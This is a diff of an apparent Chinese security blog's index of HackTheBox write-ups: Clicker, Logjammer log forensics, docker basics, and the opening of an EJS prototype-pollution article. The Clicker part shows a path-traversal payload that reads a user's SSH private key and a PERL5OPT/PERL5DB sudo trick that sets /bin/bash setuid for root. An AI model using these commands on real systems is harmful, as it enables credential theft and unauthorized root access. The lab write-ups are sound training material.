strncpy(dest, argv[2], 0x14uLL);</span><br><span class="line">LABEL_10:</span><br><span class="line">        strcpy(s, &quot;/home/jack/queries/&quot;);</span><br><span class="line">        v4 = strlen(s);</span><br><span class="line">        v5 = strlen(dest);</span><br><span class="line">        name = (char *)calloc(v4 + v5 + 1, 1uLL);</span><br><span class="line">        strcat(name, s);</span><br><span class="line">        strcat(name, dest);</span><br><span class="line">        setreuid(0x3E8u, 0x3E8u);</span><br><span class="line">        if ( access(name, 4) )</span><br><span class="line">        &#123;</span><br><span class="line">          puts(&quot;File not readable or not found&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        else</span><br><span class="line">        &#123;</span><br><span class="line">          strcpy(src, &quot;/usr/bin/mysql -u clicker_db_user --password=&#x27;clicker_db_password&#x27; clicker -v &lt; &quot;);</span><br><span class="line">          v6 = strlen(src);</span><br><span class="line">          v7 = strlen(dest);</span><br><span class="line">          command = (char *)calloc(v6 + v7 + 1, 1uLL);</span><br><span class="line">          strcat(command, src);</span><br><span class="line">          strcat(command, name);</span><br><span class="line">          system(command);</span><br><span class="line">        &#125;</span><br><span class="line">        result = 0;</span><br><span class="line">        break;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;ERROR: not enough arguments&quot;);</span><br><span class="line">    return 1;</span><br><span class="line">  &#125;</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>然后就卡住了，于是参考下国外师傅写的<a href="https://medium.com/@depradip_8731/clicker-htb-writeup-walkthrough-f9bc00b57dee">wp</a>是去读取了jack的id_rsa私钥</p>
+<p>这里的参数5是因为在上述代码中如果不为1234中的一个，就会执行第三个命令行参数 <code>argv[2]</code> 的内容复制到 <code>dest</code> 变量中</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">default:</span><br><span class="line">    strncpy(dest, argv[2], 0x14uLL);</span><br></pre></td></tr></table></figure>
+
+<p>然后拼接文件路径，然后检查文件是否可读。如果文件不可读或者不存在，程序会输出 “File not readable or not found”。否则，将会构建一个 MySQL 命令并执行它，因为拼接的路径为<code>/home/jack/queries/</code>，所以要先返回上一级目录</p>
+<p>payload如下</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./execute_query 5 ../.ssh/id_rsa</span><br></pre></td></tr></table></figure>
+
+<p>成功读取</p>
+<p><img src="/article/Clicker-HackTheBox/image-20240110180639183.png"></p>
+<p>将这一长串保存下来命名为id_rsa</p>
+<p>由于为了确保私钥的安全性，私钥文件应该只对所有者有读写权限</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chmod 600 id_rsa</span><br></pre></td></tr></table></figure>
+
+<p>然后注意OpenSSH内容格式不对，所以将三个<code>-</code>修改为五个</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-----BEGIN OPENSSH PRIVATE KEY-----</span><br><span class="line">b3BlbnNzaC1rZXktdjEAAAAAB...</span><br><span class="line">-----END OPENSSH PRIVATE KEY-----</span><br></pre></td></tr></table></figure>
+
+<p>直接ssh连接，得到user的flag</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh -i id_rsa jack@10.10.11.232</span><br></pre></td></tr></table></figure>
+
+<p><img src="/article/Clicker-HackTheBox/image-20240110184119487.png"></p>
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>我们sudo发现有monitor.sh，然后cat看下具体内容</p>
+<p><img src="/article/Clicker-HackTheBox/image-20240110184926380.png"></p>
+<p>这里注意到两个文件<code>/usr/bin/xml_pp</code>和<code>/usr/bin/echo</code>（后者并没有什么特殊用处）</p>
+<p>而我们跟进<code>/usr/bin/xml_pp</code>发现是perl脚本运行</p>
+<p><img src="/article/Clicker-HackTheBox/image-20240110185423524.png"></p>
+<p>通过搜索得知一种名为perl_startup的提权方式 <a href="https://www.exploit-db.com/exploits/39702">参考文章</a></p>
+<p>我们直接给monitor.sh赋予<code>/bin/bash</code>权限</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo PERL5OPT=-d PERL5DB=&#x27;exec &quot;chmod u+s /bin/bash&quot;&#x27; /opt/monitor.sh</span><br><span class="line">//u+s表示给user用户添加权限，即/bin/bash</span><br></pre></td></tr></table></figure>
+
+<p>然后再<code>bash -p</code>即可（用于启用特权模式（privileged mode）的一个选项，保留有效用户的特权和权限）</p>
+<p>得到root的flag</p>
+<p><img src="/article/Clicker-HackTheBox/image-20240110185919717.png"></p>
+]]></content>
+      <categories>
+        <category>渗透</category>
+      </categories>
+      <tags>
+        <tag>HackTheBox</tag>
+        <tag>提权</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Logjammer-HackTheBox</title>
+    <url>/article/Logjammer-HackTheBox.html</url>
+    <content><![CDATA[<p>多个Windows日志文件进行分析，不同的操作被记录在不同的日志并且对应的事件ID很重要，极大方便我们审计日志</p>
+<span id="more"></span>
+
+
+
+<h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><blockquote>
+<p>您有机会在一家大型咨询公司担任初级 DFIR 顾问。但是，他们提供了技术评估供您完成。咨询公司 Forela-Security 希望评估您对 Windows 事件日志分析的了解。请分析并报告他们提出的问题。</p>
+</blockquote>
+<h1 id="Task1"><a href="#Task1" class="headerlink" title="Task1"></a>Task1</h1><p><strong>用户 cyberjunkie 何时成功登录他的计算机？ （世界标准时间）</strong></p>
+<p>题目附件有五个，其中记录Windows登录的日志文件为<code>Security.evtx</code></p>
+<p>我们进行搜索找到cyberjunkie登录的时间，转换一下为<code>27/03/2023 14:37:09</code></p>
+<p><img src="/article/Logjammer-HackTheBox/image-20240422170139500.png"></p>
+<h1 id="Task2"><a href="#Task2" class="headerlink" title="Task2"></a>Task2</h1><p><strong>用户篡改了系统上的防火墙设置。分析防火墙事件日志以找出添加的防火墙规则的名称？</strong></p>
+<p>我们切换到<code>Windows Firewall-Firewall.evtx</code>日志文件，初步发现事件2004是修改&#x2F;添加规则的</p>
+<p>那么我们在Windows系统下，使用工具EvtxeCmd将其转换成json格式</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./EvtxeCmd.exe -f D:\网安工具\取证\附件\Windows-Firewall-Firewall.evtx --json D:\网安工具\取证\附件</span><br></pre></td></tr></table></figure>
+
+<p>然后使用jq命令筛选事件2004和查询PayloadData1字段</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat 20240422094340_EvtxECmd_Output.json | D:\网安工具\取证\jq-1.7.1\jq -c &#x27;select(.EventId == 2004)&#x27; | D:\网安工具\取证\jq-1.7.1\jq -s &#x27;.[0] | [.PayloadData1]&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>得到添加的规则为<code>Metasploit C2 Bypass</code></p>
+<p><img src="/article/Logjammer-HackTheBox/image-20240422194553198.png"></p>
+<h1 id="Task3"><a href="#Task3" class="headerlink" title="Task3"></a>Task3</h1><p><strong>防火墙规则的方向是什么？</strong></p>
+<p>很明显是出站，英文就是outbound</p>
+<p><img src="/article/Logjammer-HackTheBox/image-20240422195244130.png"></p>
+<h1 id="Task4"><a href="#Task4" class="headerlink" title="Task4"></a>Task4</h1><p><strong>用户更改了计算机的审计策略。这个更改策略的子类是什么？</strong></p>
+<p>审计策略更改的日志 ID 为 <code>4719</code></p>
+<p>子类为<code>Other Object Access Events</code></p>
+<h1 id="Task5"><a href="#Task5" class="headerlink" title="Task5"></a>Task5</h1><p><strong>用户“cyberjunkie”创建了一个计划任务。这个任务的名字是什么？</strong></p>
+<blockquote>
+<p>在 Windows 操作系统中，创建计划任务的事件将被记录在 Windows 安全事件日志（Security Event Log）中，并使用事件 ID 4698</p>
+</blockquote>
+<p>直接筛选事件为4698，任务名为<code>HTB-AUTOMATION</code></p>
+<p><img src="/article/Logjammer-HackTheBox/image-20240422200633789.png"></p>
+<h1 id="Task6"><a href="#Task6" class="headerlink" title="Task6"></a>Task6</h1><p><strong>为任务安排的文件的完整路径是什么？</strong></p>
+<p>在前一题的TaskContent找到路径</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:\Users\CyberJunkie\Desktop\Automation-HTB.ps1</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="Task7"><a href="#Task7" class="headerlink" title="Task7"></a>Task7</h1><p><strong>该命令的参数是什么？</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-A cyberjunkie@hackthebox.eu</span><br></pre></td></tr></table></figure>
+
+<p><img src="/article/Logjammer-HackTheBox/image-20240422200911551.png"></p>
+<h1 id="Task8"><a href="#Task8" class="headerlink" title="Task8"></a>Task8</h1><p><strong>系统上运行的防病毒软件识别出威胁并对其执行操作。哪个工具被防病毒软件识别为恶意软件？</strong></p>
+<p>该操作是在<code>Windows Defender</code>日志文件下记录的，并且对应ID为1117、1003、1004、1116等</p>
+<p>所以我们直接锁定到事件1117，发现恶意软件被警告</p>
+<p><img src="/article/Logjammer-HackTheBox/image-20240422201354285.png"></p>
+<h1 id="Task9"><a href="#Task9" class="headerlink" title="Task9"></a>Task9</h1><p><strong>引发警报的恶意软件的完整路径是什么？</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:\Users\CyberJunkie\Downloads\SharpHound-v1.1.0.zip</span><br></pre></td></tr></table></figure>
+
+<h1 id="Task10"><a href="#Task10" class="headerlink" title="Task10"></a>Task10</h1><p><strong>防病毒软件采取了什么行动？</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Quarantine  //隔离</span><br></pre></td></tr></table></figure>
+
+<p><img src="/article/Logjammer-HackTheBox/image-20240422201658602.png"></p>
+<h1 id="Task11"><a href="#Task11" class="headerlink" title="Task11"></a>Task11</h1><p><strong>用户使用Powershell执行命令。用户执行了什么命令？</strong></p>
+<blockquote>
+<p>一般情况下，用户在 PowerShell 中执行命令所生成的事件记录在 Windows 安全事件日志（Security Event Log）中的事件 ID 4104。</p>
+</blockquote>
+<p>直接切换到<code>Powershell-Operational</code>日志文件，然后筛选事件4104，找到执行的命令</p>
+<p><img src="/article/Logjammer-HackTheBox/image-20240422202108317.png"></p>
+<h1 id="Task12"><a href="#Task12" class="headerlink" title="Task12"></a>Task12</h1><p><strong>我们怀疑用户删除了一些事件日志。哪个事件日志文件被清除？</strong></p>
+<p>切换到System日志文件，找到被删除的日志文件</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Microsoft-Windows-Windows Firewall With Advanced Security/Firewall</span><br></pre></td></tr></table></figure>
+
+<p><img src="/article/Logjammer-HackTheBox/image-20240422202827593.png"></p>
+]]></content>
+      <categories>
+        <category>日志分析</category>
+      </categories>
+      <tags>
+        <tag>HackTheBox</tag>
+        <tag>Windows</tag>
+      </tags>
   </entry>
   <entry>
     <title>Meerkat-HackTheBox</title>
@@ -666,84 +843,6 @@
       </categories>
       <tags>
         <tag>HackTheBox</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Logjammer-HackTheBox</title>
-    <url>/article/Logjammer-HackTheBox.html</url>
-    <content><![CDATA[<p>多个Windows日志文件进行分析，不同的操作被记录在不同的日志并且对应的事件ID很重要，极大方便我们审计日志</p>
-<span id="more"></span>
-
-
-
-<h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><blockquote>
-<p>您有机会在一家大型咨询公司担任初级 DFIR 顾问。但是，他们提供了技术评估供您完成。咨询公司 Forela-Security 希望评估您对 Windows 事件日志分析的了解。请分析并报告他们提出的问题。</p>
-</blockquote>
-<h1 id="Task1"><a href="#Task1" class="headerlink" title="Task1"></a>Task1</h1><p><strong>用户 cyberjunkie 何时成功登录他的计算机？ （世界标准时间）</strong></p>
-<p>题目附件有五个，其中记录Windows登录的日志文件为<code>Security.evtx</code></p>
-<p>我们进行搜索找到cyberjunkie登录的时间，转换一下为<code>27/03/2023 14:37:09</code></p>
-<p><img src="/article/Logjammer-HackTheBox/image-20240422170139500.png"></p>
-<h1 id="Task2"><a href="#Task2" class="headerlink" title="Task2"></a>Task2</h1><p><strong>用户篡改了系统上的防火墙设置。分析防火墙事件日志以找出添加的防火墙规则的名称？</strong></p>
-<p>我们切换到<code>Windows Firewall-Firewall.evtx</code>日志文件，初步发现事件2004是修改&#x2F;添加规则的</p>
-<p>那么我们在Windows系统下，使用工具EvtxeCmd将其转换成json格式</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./EvtxeCmd.exe -f D:\网安工具\取证\附件\Windows-Firewall-Firewall.evtx --json D:\网安工具\取证\附件</span><br></pre></td></tr></table></figure>
-
-<p>然后使用jq命令筛选事件2004和查询PayloadData1字段</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat 20240422094340_EvtxECmd_Output.json | D:\网安工具\取证\jq-1.7.1\jq -c &#x27;select(.EventId == 2004)&#x27; | D:\网安工具\取证\jq-1.7.1\jq -s &#x27;.[0] | [.PayloadData1]&#x27;</span><br></pre></td></tr></table></figure>
-
-<p>得到添加的规则为<code>Metasploit C2 Bypass</code></p>
-<p><img src="/article/Logjammer-HackTheBox/image-20240422194553198.png"></p>
-<h1 id="Task3"><a href="#Task3" class="headerlink" title="Task3"></a>Task3</h1><p><strong>防火墙规则的方向是什么？</strong></p>
-<p>很明显是出站，英文就是outbound</p>
-<p><img src="/article/Logjammer-HackTheBox/image-20240422195244130.png"></p>
-<h1 id="Task4"><a href="#Task4" class="headerlink" title="Task4"></a>Task4</h1><p><strong>用户更改了计算机的审计策略。这个更改策略的子类是什么？</strong></p>
-<p>审计策略更改的日志 ID 为 <code>4719</code></p>
-<p>子类为<code>Other Object Access Events</code></p>
-<h1 id="Task5"><a href="#Task5" class="headerlink" title="Task5"></a>Task5</h1><p><strong>用户“cyberjunkie”创建了一个计划任务。这个任务的名字是什么？</strong></p>
-<blockquote>
-<p>在 Windows 操作系统中，创建计划任务的事件将被记录在 Windows 安全事件日志（Security Event Log）中，并使用事件 ID 4698</p>
-</blockquote>
-<p>直接筛选事件为4698，任务名为<code>HTB-AUTOMATION</code></p>
-<p><img src="/article/Logjammer-HackTheBox/image-20240422200633789.png"></p>
-<h1 id="Task6"><a href="#Task6" class="headerlink" title="Task6"></a>Task6</h1><p><strong>为任务安排的文件的完整路径是什么？</strong></p>
-<p>在前一题的TaskContent找到路径</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:\Users\CyberJunkie\Desktop\Automation-HTB.ps1</span><br></pre></td></tr></table></figure>
-
-
-
-<h1 id="Task7"><a href="#Task7" class="headerlink" title="Task7"></a>Task7</h1><p><strong>该命令的参数是什么？</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-A cyberjunkie@hackthebox.eu</span><br></pre></td></tr></table></figure>
-
-<p><img src="/article/Logjammer-HackTheBox/image-20240422200911551.png"></p>
-<h1 id="Task8"><a href="#Task8" class="headerlink" title="Task8"></a>Task8</h1><p><strong>系统上运行的防病毒软件识别出威胁并对其执行操作。哪个工具被防病毒软件识别为恶意软件？</strong></p>
-<p>该操作是在<code>Windows Defender</code>日志文件下记录的，并且对应ID为1117、1003、1004、1116等</p>
-<p>所以我们直接锁定到事件1117，发现恶意软件被警告</p>
-<p><img src="/article/Logjammer-HackTheBox/image-20240422201354285.png"></p>
-<h1 id="Task9"><a href="#Task9" class="headerlink" title="Task9"></a>Task9</h1><p><strong>引发警报的恶意软件的完整路径是什么？</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:\Users\CyberJunkie\Downloads\SharpHound-v1.1.0.zip</span><br></pre></td></tr></table></figure>
-
-<h1 id="Task10"><a href="#Task10" class="headerlink" title="Task10"></a>Task10</h1><p><strong>防病毒软件采取了什么行动？</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Quarantine  //隔离</span><br></pre></td></tr></table></figure>
-
-<p><img src="/article/Logjammer-HackTheBox/image-20240422201658602.png"></p>
-<h1 id="Task11"><a href="#Task11" class="headerlink" title="Task11"></a>Task11</h1><p><strong>用户使用Powershell执行命令。用户执行了什么命令？</strong></p>
-<blockquote>
-<p>一般情况下，用户在 PowerShell 中执行命令所生成的事件记录在 Windows 安全事件日志（Security Event Log）中的事件 ID 4104。</p>
-</blockquote>
-<p>直接切换到<code>Powershell-Operational</code>日志文件，然后筛选事件4104，找到执行的命令</p>
-<p><img src="/article/Logjammer-HackTheBox/image-20240422202108317.png"></p>
-<h1 id="Task12"><a href="#Task12" class="headerlink" title="Task12"></a>Task12</h1><p><strong>我们怀疑用户删除了一些事件日志。哪个事件日志文件被清除？</strong></p>
-<p>切换到System日志文件，找到被删除的日志文件</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Microsoft-Windows-Windows Firewall With Advanced Security/Firewall</span><br></pre></td></tr></table></figure>
-
-<p><img src="/article/Logjammer-HackTheBox/image-20240422202827593.png"></p>
-]]></content>
-      <categories>
-        <category>日志分析</category>
-      </categories>
-      <tags>
-        <tag>HackTheBox</tag>
-        <tag>Windows</tag>
       </tags>
   </entry>
   <entry>
@@ -1664,6 +1763,98 @@
       </tags>
   </entry>
   <entry>
+    <title>docker</title>
+    <url>/article/docker.html</url>
+    <content><![CDATA[<p>docker搭建环境的基本命令</p>
+<span id="more"></span>
+
+<h1 id="docker部署"><a href="#docker部署" class="headerlink" title="docker部署"></a>docker部署</h1><p>启动docker</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">service docker start</span><br></pre></td></tr></table></figure>
+
+<p>首先在题目附件中带有dockerfile的目录打开终端，如</p>
+<p><img src="/article/docker/image-20231126144440949.png"></p>
+<p>然后输入下面命令</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker build -t paywall .</span><br></pre></td></tr></table></figure>
+
+<p>接着查看是否启动</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker images</span><br></pre></td></tr></table></figure>
+
+<p><img src="/article/docker/image-20231126144606567.png"></p>
+<p>然后创建</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker run -i -d -P paywall</span><br></pre></td></tr></table></figure>
+
+<p>ps查看，发现成功</p>
+<p><img src="/article/docker/image-20231126144706256.png"></p>
+<p><strong>注意dockerfile的文件路径是否正确</strong></p>
+<p>复现完题目后，先删除容器再删除镜像，依次执行如下</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker stop 578677ecd7e9</span><br><span class="line">docker rm 578677ecd7e9</span><br><span class="line">docker rmi ezrce</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+
+
+<h2 id="容器使用"><a href="#容器使用" class="headerlink" title="容器使用"></a>容器使用</h2><p>如果我们本地没有 ubuntu 镜像，我们可以使用 docker pull 命令来载入 ubuntu 镜像</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker pull ubuntu</span><br></pre></td></tr></table></figure>
+
+<p>参数说明：</p>
+<ul>
+<li><strong>-i</strong>: 交互式操作。</li>
+<li><strong>-t</strong>: 终端。</li>
+<li><strong>ubuntu</strong>: ubuntu 镜像。</li>
+<li><strong>&#x2F;bin&#x2F;bash</strong>：放在镜像名后的是命令，这里我们希望有个交互式 Shell，因此用的是 &#x2F;bin&#x2F;bash。</li>
+</ul>
+<p><img src="/article/docker/image-20230904231622958.png"></p>
+<p>如果退出终端，直接输入 exit</p>
+<p>查看所有的容器命令如下</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker ps -a</span><br></pre></td></tr></table></figure>
+
+<p><img src="/article/docker/image-20230904231912177.png"></p>
+<p>启动一个已停止的容器</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ docker start 7f840622fe25</span><br></pre></td></tr></table></figure>
+
+<p><img src="/article/docker/image-20230904233049365.png"></p>
+<p>停止容器的命令如下</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker stop 7f840622fe25</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="exec-命令"><a href="#exec-命令" class="headerlink" title="exec 命令"></a>exec 命令</h2><p>下面演示了使用 docker exec 命令。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker exec -it 7f840622fe25 /bin/bash</span><br></pre></td></tr></table></figure>
+
+<p><img src="/article/docker/image-20230904233037481.png"></p>
+<h2 id="cp命令"><a href="#cp命令" class="headerlink" title="cp命令"></a>cp命令</h2><p>将主机&#x2F;www&#x2F;runoob目录拷贝到容器96f7f14e99ab的&#x2F;www目录下。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker cp /www/runoob 96f7f14e99ab:/www/</span><br></pre></td></tr></table></figure>
+
+<p>将主机&#x2F;www&#x2F;runoob目录拷贝到容器96f7f14e99ab中，目录重命名为www。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker cp /www/runoob 96f7f14e99ab:/www</span><br></pre></td></tr></table></figure>
+
+<p>将容器96f7f14e99ab的&#x2F;www目录拷贝到主机的&#x2F;tmp目录中。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker cp  96f7f14e99ab:/www /tmp/</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="docker-compose部署"><a href="#docker-compose部署" class="headerlink" title="docker-compose部署"></a>docker-compose部署</h1><p>主要用于vulhub靶场搭建，进入到漏洞目录对靶场进行编译</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker-compose build</span><br></pre></td></tr></table></figure>
+
+<p>然后运行此靶场</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>
+
+<p>查看启动环境</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker-compose ps -a</span><br></pre></td></tr></table></figure>
+
+<p>关闭靶场环境</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker-compose down</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <categories>
+        <category>杂项</category>
+      </categories>
+  </entry>
+  <entry>
     <title>Unit42-HackTheBox</title>
     <url>/article/Unit42-HackTheBox.html</url>
     <content><![CDATA[<p>Windows系统日志分析</p>
@@ -1779,173 +1970,6 @@
       <tags>
         <tag>HackTheBox</tag>
         <tag>Windows</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>docker</title>
-    <url>/article/docker.html</url>
-    <content><![CDATA[<p>docker搭建环境的基本命令</p>
-<span id="more"></span>
-
-<h1 id="docker部署"><a href="#docker部署" class="headerlink" title="docker部署"></a>docker部署</h1><p>启动docker</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">service docker start</span><br></pre></td></tr></table></figure>
-
-<p>首先在题目附件中带有dockerfile的目录打开终端，如</p>
-<p><img src="/article/docker/image-20231126144440949.png"></p>
-<p>然后输入下面命令</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker build -t paywall .</span><br></pre></td></tr></table></figure>
-
-<p>接着查看是否启动</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker images</span><br></pre></td></tr></table></figure>
-
-<p><img src="/article/docker/image-20231126144606567.png"></p>
-<p>然后创建</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker run -i -d -P paywall</span><br></pre></td></tr></table></figure>
-
-<p>ps查看，发现成功</p>
-<p><img src="/article/docker/image-20231126144706256.png"></p>
-<p><strong>注意dockerfile的文件路径是否正确</strong></p>
-<p>复现完题目后，先删除容器再删除镜像，依次执行如下</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker stop 578677ecd7e9</span><br><span class="line">docker rm 578677ecd7e9</span><br><span class="line">docker rmi ezrce</span><br></pre></td></tr></table></figure>
-
-
-
-
-
-
-
-
-
-<h2 id="容器使用"><a href="#容器使用" class="headerlink" title="容器使用"></a>容器使用</h2><p>如果我们本地没有 ubuntu 镜像，我们可以使用 docker pull 命令来载入 ubuntu 镜像</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker pull ubuntu</span><br></pre></td></tr></table></figure>
-
-<p>参数说明：</p>
-<ul>
-<li><strong>-i</strong>: 交互式操作。</li>
-<li><strong>-t</strong>: 终端。</li>
-<li><strong>ubuntu</strong>: ubuntu 镜像。</li>
-<li><strong>&#x2F;bin&#x2F;bash</strong>：放在镜像名后的是命令，这里我们希望有个交互式 Shell，因此用的是 &#x2F;bin&#x2F;bash。</li>
-</ul>
-<p><img src="/article/docker/image-20230904231622958.png"></p>
-<p>如果退出终端，直接输入 exit</p>
-<p>查看所有的容器命令如下</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker ps -a</span><br></pre></td></tr></table></figure>
-
-<p><img src="/article/docker/image-20230904231912177.png"></p>
-<p>启动一个已停止的容器</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ docker start 7f840622fe25</span><br></pre></td></tr></table></figure>
-
-<p><img src="/article/docker/image-20230904233049365.png"></p>
-<p>停止容器的命令如下</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker stop 7f840622fe25</span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="exec-命令"><a href="#exec-命令" class="headerlink" title="exec 命令"></a>exec 命令</h2><p>下面演示了使用 docker exec 命令。</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker exec -it 7f840622fe25 /bin/bash</span><br></pre></td></tr></table></figure>
-
-<p><img src="/article/docker/image-20230904233037481.png"></p>
-<h2 id="cp命令"><a href="#cp命令" class="headerlink" title="cp命令"></a>cp命令</h2><p>将主机&#x2F;www&#x2F;runoob目录拷贝到容器96f7f14e99ab的&#x2F;www目录下。</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker cp /www/runoob 96f7f14e99ab:/www/</span><br></pre></td></tr></table></figure>
-
-<p>将主机&#x2F;www&#x2F;runoob目录拷贝到容器96f7f14e99ab中，目录重命名为www。</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker cp /www/runoob 96f7f14e99ab:/www</span><br></pre></td></tr></table></figure>
-
-<p>将容器96f7f14e99ab的&#x2F;www目录拷贝到主机的&#x2F;tmp目录中。</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker cp  96f7f14e99ab:/www /tmp/</span><br></pre></td></tr></table></figure>
-
-
-
-<h1 id="docker-compose部署"><a href="#docker-compose部署" class="headerlink" title="docker-compose部署"></a>docker-compose部署</h1><p>主要用于vulhub靶场搭建，进入到漏洞目录对靶场进行编译</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker-compose build</span><br></pre></td></tr></table></figure>
-
-<p>然后运行此靶场</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>
-
-<p>查看启动环境</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker-compose ps -a</span><br></pre></td></tr></table></figure>
-
-<p>关闭靶场环境</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker-compose down</span><br></pre></td></tr></table></figure>
-
-]]></content>
-      <categories>
-        <category>杂项</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>ejs默认配置之原型链污染</title>
-    <url>/article/ejs%E9%BB%98%E8%AE%A4%E9%85%8D%E7%BD%AE-%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93.html</url>
-    <content><![CDATA[<p>ejs默认配置造成原型链污染</p>
-<span id="more"></span>
-
-<h1 id="ejs默认配置之原型链污染"><a href="#ejs默认配置之原型链污染" class="headerlink" title="ejs默认配置之原型链污染"></a>ejs默认配置之原型链污染</h1><p><a href="https://mizu.re/post/ejs-server-side-prototype-pollution-gadgets-to-rce#sspp_gadget">参考文章</a></p>
-<h2 id="漏洞背景"><a href="#漏洞背景" class="headerlink" title="漏洞背景"></a>漏洞背景</h2><p>EJS维护者对原型链污染的问题有着很好的理解，并使用非常安全的函数清理他们创建的每个对象</p>
-<p>利用<code>Render()</code></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">exports.render = function (template, d, o) &#123;</span><br><span class="line">    var data = d || utils.createNullProtoObjWherePossible();</span><br><span class="line">    var opts = o || utils.createNullProtoObjWherePossible();</span><br><span class="line"></span><br><span class="line">    // No options object -- if there are optiony names</span><br><span class="line">    // in the data, copy them to options</span><br><span class="line">    if (arguments.length == 2) &#123;</span><br><span class="line">        utils.shallowCopyFromList(opts, data, _OPTS_PASSABLE_WITH_DATA);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return handleCache(opts, template)(data);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
-
-<p>以及<code>createNullProtoObjWherePossible()</code></p>
